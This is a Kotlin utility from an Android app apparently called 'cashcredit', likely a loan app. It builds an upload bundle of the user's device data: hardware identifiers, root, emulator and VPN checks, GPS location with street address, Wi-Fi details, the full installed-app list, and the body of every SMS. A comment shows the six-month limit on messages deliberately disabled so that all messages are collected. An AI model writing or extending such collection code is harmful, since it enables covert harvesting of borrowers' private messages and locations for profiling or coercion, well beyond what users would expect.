package com.example.cashcredit.util

import android.Manifest
import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorManager
import android.location.Address
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.util.Log
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.telephony.TelephonyManager
import android.text.TextUtils
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.content.ContextCompat
import com.example.cashcredit.model.*
import com.example.cashcredit.util.DeviceDataCollector.escapeJson
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.*
import kotlin.math.roundToInt
import kotlin.math.sqrt

/**
 * 设备数据收集工具类
 * 用于收集所有需要上传的设备信息
 */
object DeviceDataCollector {

    /**
     * 收集所有设备数据
     */
    fun collectAllData(context: Context): DeviceUploadData {
        val currentTime = System.currentTimeMillis()

        return DeviceUploadData(
            basic = collectBasicInfo(context, currentTime),
            location = collectLocationInfo(context),
            networkInfo = collectNetworkInfo(context),
            installedApps = collectInstalledApps(context),
            sensorList = collectSensorList(context),
            sms = collectSmsList(context)
        )
    }

    /**
     * 收集基本信息
     */
    private fun collectBasicInfo(context: Context, currentTime: Long): BasicInfo {
        return BasicInfo(
            deviceBase = collectDeviceBaseInfo(context, currentTime),
            general = collectGeneralInfo(context),
            locale = collectLocaleInfo(context),
            screen = collectScreenInfo(context),
            storage = collectStorageInfo(context),
            battery = collectBatteryInfo(context)
        )
    }

    /**
     * 收集设备基础信息
     */
    @SuppressLint("HardwareIds")
    private fun collectDeviceBaseInfo(context: Context, currentTime: Long): DeviceBaseInfo {
        return DeviceBaseInfo(
            buildName = AppDeviceInfo.getAppVersion(context),
            brand = Build.BRAND ?: "Unknown",
            model = Build.MODEL ?: "Unknown",
            deviceName = Build.DEVICE ?: "Unknown",
            sdkVersion = Build.VERSION.SDK_INT,
            release = Build.VERSION.RELEASE ?: "Unknown",
            // Build.getSerial() 需要系统权限 READ_PRIVILEGED_PHONE_STATE
            // 普通应用无法获取，直接返回 unknown
            serialNumber = "unknown",
            androidId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "Unknown",
            phoneType = getPhoneType(context),
            MANUFACTURER = Build.MANUFACTURER ?: "Unknown",
            FINGERPRINT = Build.FINGERPRINT ?: "Unknown",
            gaid = null, // 需要Google Play Services
            cores = Runtime.getRuntime().availableProcessors(),
            buildTime = currentTime,
            board = Build.BOARD ?: "Unknown",
            isEmulator = if (isEmulator()) 1 else 0,
            deviceUUID = AppDeviceInfo.getUuid(),
            currentSystemTime = currentTime,
            createTime = currentTime
        )
    }

    /**
     * 获取手机类型
     */
    private fun getPhoneType(context: Context): Int {
        return try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            telephonyManager.phoneType
        } catch (e: Exception) { 0 }
    }

    /**
     * 检测是否为模拟器
     */
    private fun isEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || "google_sdk" == Build.PRODUCT
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu"))
    }

    /**
     * 收集通用信息
     */
    private fun collectGeneralInfo(context: Context): GeneralInfo {
        return GeneralInfo(
            isRootJailbreak = if (isRooted()) 1 else 0,
            canCallPhone = 1,
            keyboardType = 1,
            isUsingProxyPort = if (isUsingProxyPort()) 1 else 0,
            isUsingVpn = if (isUsingVpn(context)) 1 else 0,
            isUsbDebug = if (isUsbDebugOn(context)) 1 else 0,
            lastBootTime = System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime(),
            isMockLocation = 0,
            elapsedRealtime = android.os.SystemClock.elapsedRealtime(),
            uptimeMillis = android.os.SystemClock.uptimeMillis()
        )
    }

    /**
     * 检测是否Root
     */
    private fun isRooted(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su"
        )
        for (path in paths) {
            if (File(path).exists()) return true
        }
        return false
    }

    /**
     * 检测是否使用代理
     */
    private fun isUsingProxyPort(): Boolean {
        return try {
            val proxyHost = System.getProperty("http.proxyHost")
            val proxyPort = System.getProperty("http.proxyPort")
            !TextUtils.isEmpty(proxyHost) && !TextUtils.isEmpty(proxyPort)
        } catch (e: Exception) { false }
    }

    /**
     * 检测是否使用VPN
     */
    private fun isUsingVpn(context: Context): Boolean {
        return try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork ?: return false
                val caps = connectivityManager.getNetworkCapabilities(network) ?: return false
                caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
            } else {
                @Suppress("DEPRECATION")
                val networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_VPN)
                networkInfo?.isConnected == true
            }
        } catch (e: Exception) { false }
    }

    /**
     * 检测USB调试是否开启
     */
    private fun isUsbDebugOn(context: Context): Boolean {
        return try {
            Settings.Global.getInt(context.contentResolver, Settings.Global.ADB_ENABLED, 0) == 1
        } catch (e: Exception) { false }
    }

    /**
     * 收集本地化信息
     */
    private fun collectLocaleInfo(context: Context): LocaleInfo {
        val locale = Locale.getDefault()
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        return LocaleInfo(
            localeIso3Language = try { locale.isO3Language } catch (e: Exception) { "" },
            localeDisplayLanguage = locale.displayLanguage,
            localeIso3Country = try { locale.isO3Country } catch (e: Exception) { "" },
            language = locale.language,
            timeZoneId = TimeZone.getDefault().id,
            simCountryIso = try { telephonyManager.simCountryIso ?: "" } catch (e: Exception) { "" },
            networkOperatorName = try { telephonyManager.networkOperatorName ?: "" } catch (e: Exception) { "" }
        )
    }

    /**
     * 收集屏幕信息
     */
    private fun collectScreenInfo(context: Context): ScreenInfoData {
        val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val displayMetrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getMetrics(displayMetrics)

        val physicalSize = calculateScreenSize(displayMetrics)

        return ScreenInfoData(
            widthPixels = displayMetrics.widthPixels,
            heightPixels = displayMetrics.heightPixels,
            xdpi = String.format("%.3f", displayMetrics.xdpi),
            ydpi = String.format("%.2f", displayMetrics.ydpi),
            densityDpi = displayMetrics.densityDpi,
            density = String.format("%.2f", displayMetrics.density),
            scaledDensity = String.format("%.2f", displayMetrics.scaledDensity),
            physicalSize = physicalSize
        )
    }

    /**
     * 计算屏幕物理尺寸
     */
    private fun calculateScreenSize(dm: DisplayMetrics): Double {
        val widthInches = dm.widthPixels / dm.xdpi
        val heightInches = dm.heightPixels / dm.ydpi
        val diagonalInches = sqrt(widthInches * widthInches + heightInches * heightInches)
        return (diagonalInches * 10.0).roundToInt() / 10.0
    }

    /**
     * 收集存储信息
     */
    private fun collectStorageInfo(context: Context): StorageInfoData {
        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val memoryInfo = ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(memoryInfo)

        // 内部存储
        val internalPath = Environment.getDataDirectory()
        val internalStat = StatFs(internalPath.path)
        val internalTotal = internalStat.blockCountLong * internalStat.blockSizeLong
        val internalUsable = internalStat.availableBlocksLong * internalStat.blockSizeLong

        // SD卡
        var sdTotal = 0L
        var sdUsed = 0L
        try {
            if (Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) {
                val sdPath = Environment.getExternalStorageDirectory()
                val sdStat = StatFs(sdPath.path)
                sdTotal = sdStat.blockCountLong * sdStat.blockSizeLong
                sdUsed = sdTotal - (sdStat.availableBlocksLong * sdStat.blockSizeLong)
            }
        } catch (e: Exception) { }

        return StorageInfoData(
            ramTotalSize = memoryInfo.totalMem,
            ramUsableSize = memoryInfo.availMem,
            internalStorageUsable = internalUsable,
            internalStorageTotal = internalTotal,
            memoryCardSize = sdTotal,
            memoryCardSizeUse = sdUsed,
            storageDirSize = 0,
            storageDirSizeUsable = 0
        )
    }

    /**
     * 收集电池信息
     */
    private fun collectBatteryInfo(context: Context): BatteryInfoData {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val intentFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = context.registerReceiver(null, intentFilter)

        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val chargePlug = batteryStatus?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1

        val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else 0
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
        val isUsbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB
        val isAcCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC

        return BatteryInfoData(
            isCharging = if (isCharging) 1 else 0,
            batteryPct = batteryPct,
            isUsbCharge = if (isUsbCharge) 1 else 0,
            isAcCharge = if (isAcCharge) 1 else 0,
            batteryLevel = level,
            batteryMax = scale
        )
    }

    /**
     * 收集位置信息
     */
    @SuppressLint("MissingPermission")
    private fun collectLocationInfo(context: Context): LocationInfo? {
        return try {
            if (!DeviceUtil.hasLocationPermission(context)) {
                return null
            }

            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var location: Location? = null

            // 尝试获取GPS位置
            val gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            // 尝试获取网络位置
            val networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)

            // 选择最新的位置
            location = when {
                gpsLocation != null && networkLocation != null -> {
                    if (gpsLocation.time > networkLocation.time) gpsLocation else networkLocation
                }
                gpsLocation != null -> gpsLocation
                networkLocation != null -> networkLocation
                else -> return null
            }

            // 获取地址
            var address: String? = null
            var addressObject: AddressObject? = null

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    val geocoder = Geocoder(context, Locale.getDefault())
                    val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                    if (!addresses.isNullOrEmpty()) {
                        address = addresses[0].getAddressLine(0)
                        addressObject = convertToAddressObject(addresses[0])
                    }
                } else {
                    @Suppress("DEPRECATION")
                    val geocoder = Geocoder(context, Locale.getDefault())
                    @Suppress("DEPRECATION")
                    val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                    if (!addresses.isNullOrEmpty()) {
                        address = addresses[0].getAddressLine(0)
                        addressObject = convertToAddressObject(addresses[0])
                    }
                }
            } catch (e: Exception) { }

            LocationInfo(
                latitude = location.latitude.toString(),
                longitude = location.longitude.toString(),
                accuracy = location.accuracy.toString(),
                time = location.time,
                address = address ?: "",
                addressObject = addressObject
            )
        } catch (e: Exception) {
            null
        }
    }

    /**
     * 转换地址对象
     */
    private fun convertToAddressObject(addr: Address): AddressObject {
        return AddressObject(
            countryName = addr.countryName,
            countryCode = addr.countryCode,
            adminArea = addr.adminArea,
            locality = addr.locality,
            subAdminArea = addr.subAdminArea,
            featureName = addr.featureName,
            address = listOf(addr.getAddressLine(0), null) as List<String>?
        )
    }

    /**
     * 收集网络信息
     */
    @SuppressLint("HardwareIds", "MissingPermission")
    private fun collectNetworkInfo(context: Context): NetworkInfoData {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

        // 网络类型
        val networkType = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork
                val caps = connectivityManager.getNetworkCapabilities(network)
                when {
                    caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WIFI"
                    caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "MOBILE"
                    else -> "UNKNOWN"
                }
            } else {
                @Suppress("DEPRECATION")
                when (connectivityManager.activeNetworkInfo?.type) {
                    ConnectivityManager.TYPE_WIFI -> "WIFI"
                    ConnectivityManager.TYPE_MOBILE -> "MOBILE"
                    else -> "UNKNOWN"
                }
            }
        } catch (e: Exception) { "UNKNOWN" }

        // IP地址
        val ip = getIpAddress()

        // MAC地址
        val mac = try {
            if (DeviceUtil.hasLocationPermission(context)) {
                wifiManager.connectionInfo?.macAddress
            } else null
        } catch (e: Exception) { null }

        // 当前WiFi
        val currentWifi = try {
            if (DeviceUtil.hasLocationPermission(context)) {
                val wifiInfo = wifiManager.connectionInfo
                CurrentWifiInfo(
                    ssid = wifiInfo?.ssid?.replace("\"", "") ?: "<unknown ssid>",
                    bssid = wifiInfo?.bssid ?: "02:00:00:00:00:00"
                )
            } else null
        } catch (e: Exception) { null }

        return NetworkInfoData(
            networkType = networkType,
            ip = ip,
            mac = mac,
            currentWifi = currentWifi,
            configuredWifi = null // Android 10+ 无法获取已配置WiFi列表
        )
    }

    /**
     * 获取IP地址
     */
    private fun getIpAddress(): String? {
        return try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val networkInterface = interfaces.nextElement()
                val addresses = networkInterface.inetAddresses
                while (addresses.hasMoreElements()) {
                    val address = addresses.nextElement()
                    if (!address.isLoopbackAddress && address is Inet4Address) {
                        return address.hostAddress
                    }
                }
            }
            null
        } catch (e: Exception) { null }
    }

    /**
     * 收集已安装应用列表
     */
    private fun collectInstalledApps(context: Context): List<AppInfoData> {
        val packageManager = context.packageManager
        val apps = mutableListOf<AppInfoData>()

        try {
            val installedPackages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                packageManager.getInstalledPackages(PackageManager.PackageInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                packageManager.getInstalledPackages(0)
            }

            for (packageInfo in installedPackages) {
                val appInfo = packageInfo.applicationInfo ?: continue

                apps.add(AppInfoData(
                    appName = appInfo.loadLabel(packageManager).toString(),
                    `package` = packageInfo.packageName,
                    inTime = packageInfo.firstInstallTime,
                    upTime = packageInfo.lastUpdateTime,
                    versionName = packageInfo.versionName ?: "",
                    versionCode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        packageInfo.longVersionCode
                    } else {
                        @Suppress("DEPRECATION")
                        packageInfo.versionCode.toLong()
                    },
                    appType = if ((appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0) 1 else 0,
                    flags = appInfo.flags
                ))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return apps
    }

    /**
     * 收集传感器列表
     */
    private fun collectSensorList(context: Context): List<SensorInfoData> {
        val sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
        val sensorList = mutableListOf<SensorInfoData>()

        try {
            val sensors = sensorManager.getSensorList(Sensor.TYPE_ALL)
            for (sensor in sensors) {
                sensorList.add(SensorInfoData(
                    type = sensor.type,
                    name = sensor.name,
                    version = sensor.version,
                    vendor = sensor.vendor,
                    maxRange = sensor.maximumRange.toString(),
                    minDelay = sensor.minDelay,
                    power = sensor.power.toString(),
                    resolution = sensor.resolution.toString()
                ))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return sensorList
    }

    /**
     * 收集近6个月短信
     */
    @SuppressLint("Recycle")
    private fun collectSmsList(context: Context): List<SmsInfoData> {
        val smsList = mutableListOf<SmsInfoData>()

        try {
            Log.d("DeviceDataCollector", "collectSmsList: Checking SMS permission...")
            if (!SmsUtil.hasSmsPermission(context)) {
                Log.w("DeviceDataCollector", "collectSmsList: READ_SMS permission not granted")
                return smsList
            }

            Log.d("DeviceDataCollector", "collectSmsList: Permission granted, querying SMS...")

            val contentResolver = context.contentResolver

            // 尝试查询所有短信
            val uri = android.net.Uri.parse("content://sms")
            val cursor = contentResolver.query(uri, null, null, null, "date DESC")
            Log.d("DeviceDataCollector", "collectSmsList: All SMS Cursor count = ${cursor?.count ?: "null"}")

            // 尝试单独查询收件箱
            val inboxCursor = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC"
            )
            Log.d("DeviceDataCollector", "collectSmsList: Inbox Cursor count = ${inboxCursor?.count ?: "null"}")

            // 尝试单独查询发件箱
            val sentCursor = contentResolver.query(
                android.net.Uri.parse("content://sms/sent"),
                null, null, null, "date DESC"
            )
            Log.d("DeviceDataCollector", "collectSmsList: Sent Cursor count = ${sentCursor?.count ?: "null"}")

            cursor?.use {
                val currentTime = System.currentTimeMillis()
                val sixMonthsAgo = currentTime - (6L * 30 * 24 * 60 * 60 * 1000)
                Log.d("DeviceDataCollector", "collectSmsList: currentTime = $currentTime, sixMonthsAgo = $sixMonthsAgo")

                while (it.moveToNext()) {
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
                    Log.d("DeviceDataCollector", "collectSmsList: SMS date = $date")

                    // 暂时注释掉6个月限制，收集所有短信
                    // if (date < sixMonthsAgo) {
                    //     Log.d("DeviceDataCollector", "collectSmsList: SMS is older than 6 months, breaking")
                    //     break
                    // }

                    val id = it.getLong(it.getColumnIndexOrThrow("_id"))
                    val threadId = it.getLong(it.getColumnIndexOrThrow("thread_id"))
                    val address = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    val person = it.getString(it.getColumnIndexOrThrow("person")) ?: "0"
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val type = it.getInt(it.getColumnIndexOrThrow("type"))
                    val protocol = it.getColumnIndex("protocol").let { idx ->
                        if (idx >= 0) it.getInt(idx) else null
                    }
                    val read = it.getInt(it.getColumnIndexOrThrow("read"))
                    val status = it.getColumnIndex("status").let { idx ->
                        if (idx >= 0) it.getInt(idx) else null
                    }
                    val subject = it.getColumnIndex("subject").let { idx ->
                        if (idx >= 0) it.getString(idx) else null
                    }
                    val dateSent = it.getColumnIndex("date_sent").let { idx ->
                        if (idx >= 0) it.getLong(idx) else null
                    }
                    val seen = it.getColumnIndex("seen").let { idx ->
                        if (idx >= 0) it.getInt(idx) else null
                    }

                    smsList.add(SmsInfoData(
                        id = id,
                        threadId = threadId,
                        address = address,
                        person = person,
                        body = body,
                        date = date,
                        type = type,
                        protocol = protocol,
                        read = read,
                        status = status,
                        subject = subject,
                        dateSent = dateSent,
                        seen = seen
                    ))
                }
            }

            Log.d("DeviceDataCollector", "collectSmsList: Collected ${smsList.size} SMS messages")
        } catch (e: Exception) {
            Log.e("DeviceDataCollector", "collectSmsList: Error collecting SMS", e)
        }

        return smsList
    }

    /**
     * 转义JSON特殊字符
     */
    fun escapeJson(str: String): String {
        return str
            .replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }
}